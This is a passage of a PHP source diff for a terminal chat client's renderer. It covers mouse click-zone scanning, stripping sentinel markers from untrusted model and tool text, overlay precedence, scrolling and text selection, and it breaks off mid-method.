+     * the pane box the same way marking a tool row in place breaks it (see
+     * {@see $toolCallZones}). So the scan stays here and the shell declares
+     * the sub-frame's terminal position through {@see setZoneOrigin()}, which
+     * {@see Chat::zoneAt()} subtracts before hit-testing. The origin is reset
+     * here, on every frame, so the standalone path is always `[0, 0]`.
+     *
+     * The scan is skipped outright when `CANDY_CODE_DISABLE_MOUSE` is set —
+     * with tracking off no mouse coordinates ever arrive, so keeping a stale
+     * zone registry around would be pure waste. Sentinel *stripping* is
+     * unconditional: the markers are Private-Use codepoints a terminal would
+     * paint as a replacement glyph, and sugar-core's line diff counts them
+     * as content.
+     *
+     * Marker-free frames take a `str_contains()` fast path (~0.0004ms) and
+     * skip both the parse and the strip. That is not a micro-optimisation:
+     * {@see \SugarCraft\Mouse\Scan::parse()} walks the frame cluster by
+     * cluster through `grapheme_extract()`, which measures ~24ms on a
+     * full-screen frame — roughly doubling the cost of a keystroke repaint.
+     * {@see markSessionTab()} is currently the only caller of
+     * {@see \SugarCraft\Mouse\Mark::zone()}, and it only fires when the
+     * session tab strip is drawn at all (≥2 sessions on disk), so a
+     * single-session run still takes this branch on every frame.
+     *
+     * The scan is also non-fatal. Of sugar-mouse's malformed-markup matrix
+     * (the {@see \SugarCraft\Mouse\Scan} class docblock) only a DUPLICATE id
+     * throws — an orphan close or an unclosed open is skipped and registers
+     * no zone, and a lone sentinel's own 3 bytes are skipped as zero cells
+     * while the text after it is measured as ordinary text — and this runs inside
+     * `Chat::view()`, where an escaping exception kills the whole TUI.
+     * Degrading to "no zones this frame" costs at most an unclickable frame;
+     * the alternative is a crash. Untrusted text is sentinel-stripped on the
+     * way in (see {@see untrusted()}), so a throw here means OUR markup is
+     * wrong, not that a model injected something.
+     *
+     * @param string $frame The fully-composited root frame.
+     * @param int    $width Viewport width; zone end columns clamp to it.
+     */
+    public static function scanRoot(string $frame, int $width): string
+    {
+        // Every recorded box below is relative to THIS frame; a host that
+        // composes it elsewhere re-declares the offset after compositing.
+        self::$zoneOrigin = [0, 0];
+
+        if (!str_contains($frame, Sentinel::OPEN) && !str_contains($frame, Sentinel::CLOSE)) {
+            self::scanner()->clear();
+
+            return $frame;
+        }
+
+        if (Chat::mouseMode() === MouseMode::Off) {
+            self::scanner()->clear();
+        } else {
+            try {
+                self::scanner()->scan(self::maskImageMarkers($frame), $width);
+            } catch (\Throwable) {
+                self::scanner()->clear();
+            }
+        }
+
+        return self::stripZoneMarkers($frame);
+    }
+
+    /**
+     * Blank every Private-Use cell that is NOT part of a well-formed zone
+     * sentinel, for the scan copy only.
+     *
+     * Historically the image overlay and the zone marker landed on the same
+     * codepoints — `ImageOverlay::MARKER_BASE` was U+E000 and a marker cell was
+     * `MARKER_BASE + id`, so the first picture {@see renderToolImage()} placed
+     * in a frame emitted a byte-identical copy of {@see Sentinel::OPEN} and the
+     * second emitted {@see Sentinel::CLOSE}. Handed to the scanner verbatim,
+     * those stray sentinels parsed as zone markup: measured, one image marker
+     * sitting between two marked regions made the scan drop every zone after
+     * it — session tabs, tool rows, and the status bar's `pane:menu` all
+     * stopped responding to clicks the moment a screenshot was on screen.
+     * The allocator has since moved to U+E002 + id (a32c4faae ruling,
+     * follow-up 2 of 2), so live image markers can no longer speak the zone
+     * language. The mask stays as defense-in-depth: any other PUA codepoint
+     * that reaches a frame — a Nerd Font glyph in model output, a marker from
+     * a pre-move recording — is blanked to an equal-width space instead of
+     * being handed to the scanner to interpret.
+     *
+     * Only the string the scanner reads is masked; the frame that goes to the
+     * terminal keeps its real markers, because `Program` still has to resolve
+     * them into paints. A marker's cell is a single width-1 codepoint and is
+     * replaced by a single space (its zero-width authenticating escape is an
+     * OSC, which the scanner already skips), so every zone's column arithmetic
+     * is unchanged — which is the whole reason this is a mask rather than a
+     * strip.
+     *
+     * The frame the terminal receives does not need the same treatment. A bare
+     * Private-Use codepoint there is just a glyph: since audit 15b-17
+     * `ImageOverlay::resolve()` paints only a cell preceded by the escape
+     * `ImageOverlay::marker()` emits — which {@see untrusted()} and SugarMarkdown
+     * both strip from model and tool text — and leaves every other cell in the
+     * block, Powerline and Nerd Font icons included, as it found it.
+     *
+     * Sentinel triples are matched first in the alternation so genuine markup
+     * survives; anything else in the PUA block (an image marker, or a Nerd
+     * Font glyph in model output) becomes a space. A frame carrying invalid
+     * UTF-8 makes the `/u` match fail, and the unmasked frame is scanned
+     * instead — the pre-existing behaviour, and the caller already treats a
+     * throw from the scan as "no zones this frame".
+     */
+    private static function maskImageMarkers(string $frame): string
+    {
+        $masked = preg_replace_callback(
+            '/(\x{E000}\/?[A-Za-z0-9._:-]*\x{E001})|[\x{E000}-\x{F8FF}]/u',
+            static fn(array $m): string => ($m[1] ?? '') !== '' ? $m[1] : ' ',
+            $frame,
+        );
+
+        return $masked ?? $frame;
+    }
+
+    /**
+     * The canonical marked-frame policy — {@see Sanitize::untrustedForMarkedFrames()}
+     * — for every string that originated outside this process (model replies,
+     * tool output, pasted keystrokes).
+     *
+     * The sentinel strip is the security half. `Sanitize::untrusted()` alone
+     * removes only ANSI/C0/C1/DEL; `U+E000`/`U+E001` are well-formed 3-byte
+     * UTF-8 Private-Use codepoints, so they survive it untouched and would
+     * reach {@see scanRoot()}'s parser verbatim. A model reply — or any tool
+     * output echoed into a message: a file read, a web fetch, a shell command
+     * run in a hostile repo — could then either crash the render (duplicate
+     * ids make `Scan::parse()` throw) or, worse, register attacker-chosen
+     * boxes in the hit-test registry {@see Chat::zoneAt()} reads, hijacking
+     * clicks meant for real UI. Stripping at the boundary keeps the invariant
+     * that only {@see \SugarCraft\Mouse\Mark}-emitted markers ever reach the
+     * scan. sugar-core composes the two sweeps so the predicate lives in one
+     * audited place rather than re-rolled per application.
+     *
+     * Carriage returns are mapped to line feeds on top
+     * ({@see Sanitize::untrustedForDisplay()}, audit 15b-07). The marked-frame
+     * policy keeps CR by contract, but on the wire CR is a cursor motion: it
+     * returns to column 0 of the current physical row, so the rest of a user
+     * or system row, a tool name, or an expanded Bash result with a progress
+     * bar overwrote the Files pane and the borders to its left while the frame
+     * string still looked like one row to the diff renderer. Mapping, not
+     * dropping, keeps every byte of the text on screen and agrees with
+     * {@see collapseToolOutput()}'s own `\r\n|\r|\n` split.
+     *
+     * What is deliberately NOT stripped: the rest of the Private-Use block.
+     * Image markers no longer live in the text alone — a marker is an escape
+     * plus its U+E002 + id cell, and the escape half cannot survive the ANSI
+     * sweep — so a model reply carrying U+E002 cannot paint a copy of an
+     * on-screen picture, and Powerline / Nerd Font glyphs in tool output
+     * (`eza --icons`, a starship prompt) stay visible (audit 15b-17).
+     *
+     * The consequence every caller has to respect: the result may now carry an
+     * LF where the input had a CR, so a value painted into a ONE-line row (a
+     * tool head, a placeholder, a hint) must be folded through
+     * {@see oneLine()} rather than this alone. The mapping is 1:1 per
+     * character except CRLF → LF, so the input box's two-pass caret math
+     * ({@see renderInput()}) still lands on the same visible column.
+     */
+    private static function untrusted(string $text): string
+    {
+        return Sanitize::stripZoneSentinels(Sanitize::untrustedForDisplay($text));
+    }
+
+    /**
+     * {@see untrusted()} folded to a single row: every run of control or
+     * whitespace characters (the LF a CR was just mapped to included) becomes
+     * one space, via {@see PaneLabel::of()} — the same fold the sidebars and
+     * the "/" popup apply.
+     *
+     * For values painted into a row that must stay ONE terminal line: a tool
+     * head is a click zone located by `str_contains()` on its recorded head
+     * ({@see $toolRowHeads}), so a break inside it would split the zone across
+     * two rows and leave the recorded label matching nothing. Applied BEFORE
+     * `Width::truncate()`, which is a width tool and keeps LF.
+     */
+    private static function oneLine(string $text): string
+    {
+        return PaneLabel::of(self::untrusted($text));
+    }
+
+    /**
+     * Remove every `U+E000 <id> U+E001` open/close sentinel pair emitted by
+     * {@see \SugarCraft\Mouse\Mark}. Matched byte-wise against Mark's own id
+     * charset (plus the closing `/`) so a frame carrying invalid UTF-8 can
+     * never make the pattern fail open and leak markers to the terminal.
+     */
+    private static function stripZoneMarkers(string $frame): string
+    {
+        return (string) preg_replace(self::ZONE_MARKER_PATTERN, '', $frame);
+    }
+
+    /**
+     * The frame's text bytes only, discarding any pixel-graphics image layer
+     * {@see renderView()} collected.
+     *
+     * Kept as the entry point for every caller that only wants the literal
+     * frame (tests, and anything composing the frame into something else):
+     * an image layer is meaningless without a {@see \SugarCraft\Core\Program}
+     * to paint it, and a plain string is what sugar-core's `Model::view()`
+     * contract calls the simple case.
+     */
+    public static function render(Chat $chat): string
+    {
+        return self::renderView($chat)->body;
+    }
+
+    /**
+     * The full frame plus the pixel-graphics layer for any image-bearing tool
+     * result in the transcript (crush_feat.md §9 E3).
+     *
+     * Sixel/Kitty/iTerm2 blobs are not text and cannot be diffed by
+     * sugar-core's line renderer, so — exactly as `sugar-gallery`'s
+     * `PosterCard` does — each blob is registered with a per-frame
+     * {@see ImageLayer}, which hands back a marker block to sit in the text
+     * frame, and the collected {@see ImageLayer::placements()} ride out on the
+     * {@see View}. `Program::renderFrame()` resolves those markers to screen
+     * positions and paints the blobs on top of the text frame, so nothing
+     * beyond returning them is needed here. A fresh layer per call is required:
+     * ids are positional to THIS frame, and a reused layer would keep painting
+     * images whose markers have since scrolled out of the transcript.
+     *
+     * $agentStripFocus is the run the live agents strip holds the keyboard on
+     * (roadmap P-B3), which is the hosting shell's state
+     * ({@see \SugarCraft\Code\App\App::$agentStripFocus}); null paints the
+     * strip unfocused. $agentStripDismissed are the runs the user took off it
+     * ({@see \SugarCraft\Code\App\App::$agentStripDismissed}).
+     *
+     * @param array<string, true> $agentStripDismissed
+     */
+    public static function renderView(Chat $chat, ?string $agentStripFocus = null, array $agentStripDismissed = []): View
+    {
+        $theme = $chat->theme();
+        $images = new ImageLayer();
+        // Both per-frame registries are cleared before the transcript is walked:
+        // their entries are positional to the frame being built, so a leftover
+        // row from the previous frame would be marked at the wrong place (or
+        // registered twice, which makes the zone scan throw).
+        self::$toolCallZones = [];
+        self::$paletteItemZones = [];
+        self::$sessionRowZones = [];
+        // Same lifetime, same reason, but NOT the same list - see
+        // $toolRowHeads for why the layout question and the click question are
+        // answered from two registries rather than one.
+        self::$toolRowHeads = [];
+        self::$agentLineZones = [];
+        self::$ctrlOThoughtKey = $chat->latestThoughtKey();
+        // One number, named once. Every producer that writes into $body below
+        // is held to it, and fitToPane() is the backstop for the ones whose
+        // own layout rules say otherwise (code blocks, tables, CJK runs).
+        //
+        // Floored at 1, not 20 (audit 15b-09). A floor of 20 made the shell 26
+        // cells wide on any terminal under 26 columns, and every overlay
+        // composited onto that backdrop was 26 wide too, so on the standalone
+        // path the terminal soft-wrapped every row. The floor used to be
+        // load-bearing because renderToolImage() reserved at least 8 cells for
+        // a picture; it now reserves `max(1, min(IMAGE_COLS, $width))`, so the
+        // marker block can never be wider than the pane it sits in and
+        // fitToPane() never rewrites the reserved cells. CL-3 removed the
+        // bordered shell, so SHELL_CHROME_COLS is 0 and the transcript gets
+        // the full width; the floor keeps its meaning for a cols=0 degenerate
+        // size, and clipFrameToCols() still cuts the frame down at the narrow
+        // sizes where the boxes that DID keep chrome (input, slash popup)
+        // cannot fit.
+        $contentWidth = max(1, $chat->cols() - self::SHELL_CHROME_COLS);
+        // Roadmap P-C2: with the shell's Agent View open, the transcript area
+        // is that run's own transcript — its projected rows, drawn by the same
+        // renderer, so tool rows expand, thoughts fold and diffs are gutted
+        // exactly as in the parent's. The parent's in-flight extras below (its
+        // live thought, its streaming reply) are the parent's, and stay out.
+        $openView = self::$agentView;
+        $body = self::renderHistory(
+            $openView === null ? $chat->history : $openView['rows'],
+            $theme,
+            $contentWidth,
+            $chat->expanded(),
+            $images,
+            $chat->mosaic(),
+            // Row budget for a single picture: anything taller is clipped off
+            // the frame's tail anyway, so encoding it would be pure waste.
+            // CL-3: the shell's 2 border rows are gone with the border, so
+            // the terminal's full height is budget.
+            max(1, $chat->rows()),
+            // Roadmap P-B2: the delegated runs' live state, for the line
+            // under each Task row. Read here, never advanced: its clock moves
+            // in update() (Chat's pump tick), so this frame stays a pure
+            // function of state.
+            $chat->agentLive(),
+            // Roadmap 3.B-3: the session's ledger as its runner holds it (a
+            // memory read), so a pruned or distilled tool row wears its
+            // badge — live, as a turn's `Prune` lands. An open Agent View
+            // shows another run's rows, which this ledger does not describe.
+            $openView === null ? $chat->contextLedgerView() : null,
+        );
+        if ($openView !== null) {
+            if ($body === '' && $openView['attach'] === null) {
+                $body = self::dim($theme)->render(
+                    $openView['transcript'] || $openView['state']?->isFinished() === false
+                        ? Lang::t(\SugarCraft\Code\Tui\AgentViewHeader::WAITING)
+                        : Lang::t(\SugarCraft\Code\Tui\AgentViewHeader::NO_TRANSCRIPT),
+                );
+            }
+            // P-E2: a question this run is waiting on shows in its own view
+            // as well as in the modal over it, so the view says why the run
+            // stopped moving. Every byte of the call stays visible text, as
+            // in the modal (audit 15b-19).
+            $request = $chat->pendingPermission();
+            $ask = $request?->pendingAsk;
+            $asker = $ask === null ? null : \SugarCraft\Code\Permissions\AskOrigin::locate($ask, $chat->history, $chat->agentLive());
+            if ($request !== null && $asker !== null && $asker->id === $openView['id']) {
+                $waiting = Style::new()->foreground($theme->userLabel)->bold()->render('⏳ ' . Lang::t('tui.agent_view.waiting_on_you') . ' ')
+                    . Style::new()->foreground($theme->systemLabel)->render(
+                        Lang::t('tui.agent_view.answer_in_prompt', ['call' => self::permissionVisibleOneLine(Message::describeToolCall($request->toolCall))]),
+                    );
+                $body = $body === '' ? $waiting : $body . "\n\n" . $waiting;
+            }
+        } elseif ($chat->inFlight) {
+            // E494 - the model's THINKING while the turn runs, painted above
+            // the reply and below whatever has already settled.
+            //
+            // Two states, split on whether the model has started SPEAKING:
+            //  - still thinking (no reply text yet): the trace itself, newlines
+            //    kept, as a rolling tail sized to the viewport - the user
+            //    reads the thought as it is written;
+            //  - past the thought (the reply is streaming): it folds into the
+            //    same collapsible "💭 Thought" row a settled turn gets, so the
+            //    answer is not pushed off-screen by the reasoning behind it.
+            //    A click opens it, keyed THOUGHT_LIVE_KEY until it lands.
+            //
+            // ABOVE the partial, not below it: the model thinks and then
+            // speaks, so a thought under the prose it produced would invert
+            // the causality the transcript is meant to show.
+            $liveThought = $chat->reasoningText();
+            if (trim($liveThought) !== '') {
+                $thought = $chat->streamingText() === ''
+                    ? self::renderLiveThinking($liveThought, $theme, $contentWidth, max(3, $chat->rows() - self::THINKING_LIVE_CHROME_ROWS))
+                    : self::renderThought($liveThought, $theme, $chat->expanded(), self::THOUGHT_LIVE_KEY);
+                $body = $body === '' ? $thought : $body . "\n\n" . $thought;
+            }
+            // The reply so far, when the model has started writing one
+            // (crush_code.md Phase 0 item 13). It sits ABOVE the spinner
+            // rather than replacing it: the turn is still running - more text
+            // is coming, and possibly tool calls after it - so removing the
+            // only "still working" affordance the moment the first token
+            // landed would make a mid-stream pause look like a finished
+            // answer.
+            //
+            // Rendered here rather than pushed into $chat->history because a
+            // half-written reply is not a turn: see Chat::$streamingText for
+            // why it must not be checkpointed, compacted or re-sent.
+            $partial = $chat->streamingText();
+            if ($partial !== '') {
+                $stream = self::renderStreamingTurn($partial, $theme, $contentWidth);
+                $body = $body === '' ? $stream : $body . "\n\n" . $stream;
+            }
+            // Visible in the chat window itself, not just the status bar -
+            // a spinner-only status line is easy to miss; this sits right
+            // where the reply is about to appear.
+            $thinking = Style::new()->foreground($theme->assistantLabel)->render('⠴ ' . Lang::t('tui.chat.assistant_thinking'));
+            $body = $body === '' ? $thinking : $body . "\n\n" . $thinking;
+        }
+        // Everything above wrote into $body; this is the single choke point
+        // where the pane-width invariant is enforced over all of it.
+        $body = self::fitToPane($body, $contentWidth);
+
+        $input = self::renderInput($chat, $theme);
+        $slashMenu = self::renderSlashMenu($chat, $theme);
+
+        // CL-3: the transcript shell paints BARE. Its rounded border +
+        // padding(1, 2) (6 cols, 4 rows) is removed unconditionally — the
+        // hosted App already frames this frame in its own ChatPane box, and
+        // the two frames together were the double chat frame the user
+        // ruling kills. Upstream crush renders borderless too, so the
+        // standalone path stays consistent; SHELL_CHROME_COLS documents the
+        // now-zero chrome every width derivation below still reads through.
+        $shell = $body;
+        $shell = self::markToolCalls($shell);
+        $shell = self::markAgentLines($shell);
+        // P-C2: a worker the view opened that keeps no transcript of its own
+        // (a workflow stage, a background session) is its live output buffer,
+        // in AgentOutputPane's Attach mode — the full-focus pane the dashboard
+        // names "attach", drawn where the transcript was.
+        if ($openView !== null && $openView['attach'] !== null) {
+            $shell = self::clipRowsToCols(
+                \SugarCraft\Code\Tui\AgentOutputPane::render(
+                    $openView['attach'],
+                    max(1, $chat->cols() - 2),
+                    max(4, $chat->rows() - 6),
+                    $theme,
+                    \SugarCraft\Code\Tui\Mode::Attach,
+                ),
+                $chat->cols(),
+            );
+        }
+
+        // Roadmap P-B3: the live agents strip, one row above the input while
+        // delegated runs are live (Appendix P §4.5). It is the in-chat agent
+        // surface while it shows, so the manager-driven block below the
+        // input, which lists the same runs, steps aside rather than paint
+        // them twice; with no live run (a workflow's stage agents, say) that
+        // block is drawn exactly as before.
+        $live = $chat->agentLive();
+        $agentStrip = \SugarCraft\Code\Tui\AgentStrip::render(
+            \SugarCraft\Code\Tui\AgentStrip::items($live, $agentStripDismissed),
+            $chat->cols(),
+            $theme,
+            $live->spinnerFrame(),
+            $agentStripFocus,
+            Chat::mouseClicksEnabled(),
+        );
+
+        $content = $shell . "\n"
+            . ($agentStrip !== '' ? $agentStrip . "\n" : '')
+            . $input . ($slashMenu !== '' ? "\n" . $slashMenu : '');
+
+        $tabStrip = self::renderSessionTabStrip($chat);
+        if ($tabStrip !== '') {
+            $content = $tabStrip . "\n" . $content;
+        }
+
+        // The footer shows only when it is the frame's sole agent listing:
+        // not while the live strip above the input paints one (pre-existing),
+        // and — CL-2 FIX 2 — not while a docked Agents sidebar paints one.
+        $agentView = ($agentStrip === '' && !self::$agentsPaneDocked)
+            ? self::renderAgentView($chat)
+            : '';
+        if ($agentView !== '') {
+            $content .= "\n" . $agentView;
+        }
+
+        // Full-window usage: fit the frame to exactly $rows lines, always.
+        // sugar-core's Renderer repaints changed rows via an ABSOLUTE
+        // cursorTo($row, 1) - it has no concept of scrolling. If $content
+        // is ever taller than the real terminal, every cursorTo() past the
+        // terminal's last row gets silently clamped there by the terminal
+        // itself, so distinct logical rows (input box, status bar, the
+        // newest history lines) all collide on that one physical row -
+        // which is exactly what "text/cursor ends up in the status bar"
+        // looks like once a conversation grows past one screen. Clipping
+        // to the tail keeps the input box (the last part of $content)
+        // and the newest history visible, scrolling older turns off the
+        // top - the same tradeoff any fixed-viewport TUI makes. Short
+        // conversations still get padded so the status bar lands on the
+        // true last line instead of leaving most of the window blank.
+        //
+        // $chat->rows() (sourced from WindowSizeMsg - the size sugar-core's
+        // Program actually dispatches, live, on every resize) is the
+        // authoritative value here - NOT a second, independent
+        // TuiRenderer::getTerminalSize() query. That second query has its
+        // own statically-cached, never-invalidated detection of the SAME
+        // terminal that can silently disagree with what Program itself
+        // knows (and never learns about a live resize either), which
+        // reintroduces the exact row-collision this clipping is meant to
+        // prevent even after clipping was added.
+        //
+        // Which $available-line window of $content is shown is the one thing
+        // the tail clip above leaves to the user: $chat->scrollOffset() is a
+        // distance in lines from the BOTTOM (0 = pinned to the newest line,
+        // the historical behaviour), so scrolling back moves the window's
+        // start earlier by exactly that many lines (crush_feat.md §8 E4).
+        // It is re-clamped against THIS frame's overflow rather than trusted:
+        // the offset was clamped against the frame that was on screen when
+        // the wheel turned, and the transcript can have shrunk since (/clear,
+        // a session switch, a resize), which would otherwise slice past the
+        // start of the content and show a short frame.
+        // The guard sees only $rows; the frame it produces is $available PLUS
+        // the unconditional status bar below, so the frame's floor is two rows:
+        // at rows=1 — a size withSize() accepts and WindowSizeMsg can report —
+        // the frame is deliberately 2, not 1. Backlog E48 took the floor as the
+        // answer rather than dropping the bar; renderStatusBar()'s docblock says
+        // why the bar is the row that survives.
+        $rows = $chat->rows();
+        // P-C2: the Agent View's header row is pinned ABOVE the clip, so the
+        // way back ("main", "esc back") never scrolls off with older rows.
+        // Dropped on a terminal too short to give it a row of its own.
+        $agentHeader = $openView === null || $rows < 4 ? '' : \SugarCraft\Code\Tui\AgentViewHeader::render(
+            $openView['name'],
+            $openView['state'],
+            $openView['siblings'],
+            $chat->cols(),
+            $theme,
+            $live->spinnerFrame(),
+            $live->now(),
+            Chat::mouseClicksEnabled(),
+        );
+        $headerRows = $agentHeader === '' ? 0 : 1;
+        $available = max(1, $rows - 1 - $headerRows);
+        $contentLines = explode("\n", $content);
+        $overflow = max(0, count($contentLines) - $available);
+        self::$maxScrollOffset = $overflow;
+        $sliceStart = 0;
+        if ($overflow > 0) {
+            $offset = max(0, min($chat->scrollOffset(), $overflow));
+            $sliceStart = $overflow - $offset;
+            $contentLines = array_slice($contentLines, $sliceStart, $available);
+        } else {
+            while (count($contentLines) < $available) {
+                $contentLines[] = '';
+            }
+        }
+
+        $frame = ($agentHeader === '' ? '' : $agentHeader . "\n")
+            . implode("\n", $contentLines) . "\n" . self::renderStatusBar($chat);
+
+        // ONE rule orders this chain: the overlay on screen must be the one
+        // Chat::update() routes the next keystroke to, because an overlay the
+        // keyboard is not driving misrepresents what the next key does. So the
+        // order here is that routing order, read off Chat::update() rather than
+        // asserted: keyHelp (checked immediately after Ctrl+C) → permission
+        // prompt → palette → session picker.
+        //
+        // Four links make SIX pairs, and they are not all the same kind of
+        // pair. "Every pair here is genuinely reachable" was the earlier
+        // sentence and it was false — only the two involving the reference were
+        // ever substantiated. What each pair actually is, measured:
+        //
+        // - reference + palette — REACHABLE, and the route is the mouse: with
+        //   the reference up its box never reaches the status bar, so the bar's
+        //   `pane:` click zone stays live underneath it, and clicking
+        //   "Ctrl+P menu" at 100x30 opens the palette with keyHelp still 0. The
+        //   reference keeps both the slot and the keyboard, which is the honest
+        //   outcome; before this ordering the palette painted while the
+        //   reference ate the keys.
+        // - reference + permission prompt — reachable only from the ENGINE path:
+        //   the reference opens from an idle turn (Chat::update()'s "?" arm,
+        //   submit()'s /keys branch) and a prompt only exists mid-turn. No
+        //   producer that exists today can put the pair up (see
+        //   Chat::requestPermission(), which documents why its generation guard
+        //   is dormant defence rather than the thing that closed a live path);
+        //   an unstamped ASK from a future pipeline still can. So the pair is
+        //   ordered by the rule rather than assumed away, and the status bar
+        //   says the prompt is there rather than leaving it invisible AND
+        //   silent (see KEY_HELP_OVER_PROMPT).
+        // - the other four pairs — reference + picker, prompt + palette,
+        //   prompt + picker, palette + picker — are FIXED PRECEDENCE FOR
+        //   DETERMINISM, not reachable states. Chat.php says so of the last of
+        //   them at its own routing site: the palette and the picker "cannot
+        //   both be open". A documented fixed order between two modals that
+        //   cannot coexist is worth having anyway — it is what stops the frame
+        //   from depending on `if` order nobody chose, the day a fifth overlay
+        //   or a new producer makes one of these pairs reachable after all.
+        //
+        // Being dormant is not being unpinned: KeyHelpTest::
+        // testTheOverlayChainPaintsInRoutingOrderRightDownTheChain() drives all
+        // four overlays up at once — a state the front door cannot reach, built
+        // deliberately — and walks the whole chain, so every one of the six
+        // pairs fails if this order changes.
+        //
+        // renderKeyHelp() being first also means it runs on every frame THIS
+        // method paints, which is what keeps its $keyHelpMaxOffset ceiling from
+        // going stale: were it last, an earlier overlay winning the slot would
+        // leave the ceiling at whatever the last painted reference measured, and
+        // Chat::withKeyHelp() clamps against it. Not every frame the app paints
+        // goes through here — $keyHelpMaxOffset's own docblock names the hosted
+        // Pane::Agents exception and why it is harmless.
+        $overlay = self::renderKeyHelp($chat, $theme);
+        if ($overlay === '') {
+            $overlay = self::renderPermissionPrompt($chat, $theme);
+        }
+        // E682: an abandoned palette is not painted — the keyboard is not
+        // driving it, which is what the ONE rule above forbids. This is the
+        // PAINT side of the seam; the CLOSE side stays at E666's delivery
+        // choke point, so the frame never fabricates an input event.
+        if ($overlay === '' && !self::$paletteAbandoned) {
+            $overlay = self::renderPalette($chat, $theme);
+        }
+        if ($overlay === '') {
+            $overlay = self::renderSessionPicker($chat, $theme);
+        }
+        if ($overlay === '') {
+            $overlay = self::renderDirectoryPicker($chat, $theme);
+        }
+        if ($overlay !== '') {
+            // The width invariant does not stop at $body: a Veil box is built
+            // at its own natural width AFTER fitToPane()'s choke point (the
+            // palette measures 56 cells at cols=40), so its rows could reach
+            // the terminal over-wide — the absolute-cursorTo row collision
+            // fitToPane() exists to prevent, on the standalone path with no
+            // hosted clipWidth() net underneath. Clip before compositing
+            // (backlog E47); see clipRowsToCols() for why this cuts rather
+            // than wraps.
+            $overlay = self::clipRowsToCols($overlay, $chat->cols());
+            // A fresh Veil per render call (rather than one persisted on
+            // Chat) means its own frame-diffing never kicks in - fine here,
+            // since Chat already does its own diffing at a higher level in
+            // view() and double-diffing isn't needed for correctness.
+            // Veil clips the overlay to the background's widest line, and the
+            // frame's lines are only as wide as their own content - so a modal
+            // wider than the current transcript would lose its right border
+            // (most visibly mid-turn, which is exactly when a permission
+            // prompt appears). Widen the backdrop to fit first.
+            //
+            // The rows the overlay covers have their zone sentinels LIFTED
+            // first and put back afterwards (audit 15b-09). Veil splits each
+            // covered row around the overlay by cell offset, and its Width
+            // calls count every sentinel codepoint (and the zone id between
+            // them) as a cell. So a covered row carrying a `toolcall:` zone,
+            // or the bar's `pane:menu` zone under a full-height palette, was
+            // cut at the wrong column: the overlay slid left by the
+            // sentinels' length on that row, id fragments leaked on screen,
+            // and the row came out wider than the terminal. With the
+            // sentinels out of the way the cut lands on visible columns; a
+            // zone lying wholly beside the overlay is restored at the same
+            // columns, and a zone the overlay overlaps is dropped, because
+            // part of it is no longer on screen.
+            [$frame, $lifted] = self::liftZonesUnderOverlay($frame, $overlay);
+            $backdrop = self::padForOverlay($frame, $overlay, $chat->cols());
+            $shift = self::overlayLeftShift($backdrop, $overlay, $chat->cols());
+            $frame = Veil::new()->withBackdrop(50)->composite(
+                $overlay,
+                $backdrop,
+                Position::CENTER,
+                Position::CENTER,
+                $shift,
+            );
+            $frame = self::restoreLiftedZones($frame, $lifted, $backdrop, $overlay, $shift);
+            // No-op unless the overlay was the palette or the session picker:
+            // only renderPalette()/renderSessionPicker() record item zones,
+            // an overlay earlier in the chain above takes the slot before
+            // either is ever called, and the two registries are therefore
+            // never both non-empty for one frame.
+            $frame = self::markPaletteItems($frame);
+            $frame = self::markSessionRows($frame);
+        }
+
+        // N-P3: what a settings save did, as a toast in the top-right corner.
+        // Only over a frame no modal holds — a modal owns the keyboard, and a
+        // toast drawn over it would hide what the next key does.
+        $toast = $chat->settingsToast();
+        if ($overlay === '' && $toast !== null) {
+            $frame = self::overlaySettingsToast($frame, $toast, $chat->cols());
+        }
+
+        // Below this terminal width at least one framed producer cannot hold
+        // its own bound and every row is cut to the terminal here instead
+        // (audit 15b-09). The binding case is the "/" popup: its narrowest
+        // painted row is {@see SLASH_MENU_MIN_COLS} wide (border + padding(0, 1)
+        // = 4, the two-column "▸ "/"  " marker, and one content cell), so at a
+        // terminal NARROWER than that it overflows no matter what the budget
+        // computes. Only at these sizes: above it each producer fits itself and
+        // this would just re-measure every row of every frame.
+        //
+        // CL-3: this bound used to be `SHELL_CHROME_COLS` (6), which happened
+        // to equal the popup's overflow edge one column below. The bordered
+        // shell is gone; the number stays, re-owned to its true reason here.
+        if ($chat->cols() < self::SLASH_MENU_MIN_COLS) {
+            $frame = self::clipFrameToCols($frame, $chat->cols());
+        }
+
+        $frame = self::scanRoot($frame, $chat->cols());
+
+        // Mouse text selection (see {@see selectableRegion()}). Measured on
+        // THIS frame, after the tail clip and the scroll window, because a
+        // selection is made against what is painted — and withheld while an
+        // overlay owns the frame: a drag over the palette is not a request to
+        // copy the transcript dimmed underneath it.
+        self::$selectableRegion = $overlay === ''
+            ? self::transcriptTextRegion($tabStrip, $shell, $sliceStart, $available)
+            : null;
+        if (self::$selectableRegion !== null && $headerRows > 0) {
+            self::$selectableRegion[0] += $headerRows;
+            self::$selectableRegion[1] += $headerRows;
+        }
+        self::$selectableLines = explode("\n", $frame);
+
+        $selection = Chat::textSelection();
+        if ($selection !== null && ($selection->dragging || $selection->settled)) {
+            $frame = implode("\n", $selection->highlight(
+                self::$selectableLines,
+                Style::new()->reverse(),
+            ));
+        }
+
+        return new View($frame, images: $images->placements());
+    }
+
+    /**
+     * The rectangle of the last frame a mouse drag may select text in, as
+     * inclusive `[rowFrom, rowTo, colFrom, colTo]` cells of that frame, or
+     * null when nothing on it is selectable. The cells are 1-based — the
+     * space SGR mouse reports, zones and sugar-mouse's
+     * {@see \SugarCraft\Mouse\Selection} use — so frame line R is
+     * `selectableLines()[R - 1]`.
+     *
+     * It is the transcript body — every row and column of the shell {@see
+     * transcriptTextRegion()} measures — over the shell's rows that survived
+     * the tail clip and scroll window. Not the whole frame: the input box,
+     * strips and status bar below it are not transcript. CL-3 removed the
+     * shell's border and padding, so there is no `│  ` gutter left to exclude
+     * and the first/last transcript row are selectable (see {@see
+     * \SugarCraft\Code\Tui\TextSelection}).
+     *
+     * @return array{0:int,1:int,2:int,3:int}|null
+     */
+    public static function selectableRegion(): ?array
+    {
+        return self::$selectableRegion;
+    }
+
+    /**
+     * The last frame's lines, unhighlighted — what a finished selection is
+     * read from. Static for {@see scanner()}'s reason: the release that
+     * copies arrives between frames and can only read the one on screen.
+     *
+     * @return list<string>
+     */
+    public static function selectableLines(): array
+    {
+        return self::$selectableLines;
+    }
+
+    /**
+     * @see selectableRegion()
+     * @return array{0:int,1:int,2:int,3:int}|null
+     */
+    private static function transcriptTextRegion(string $tabStrip, string $shell, int $sliceStart, int $available): ?array
+    {
+        $shellTop = $tabStrip === '' ? 0 : substr_count($tabStrip, "\n") + 1;
+        $shellRows = substr_count($shell, "\n") + 1;
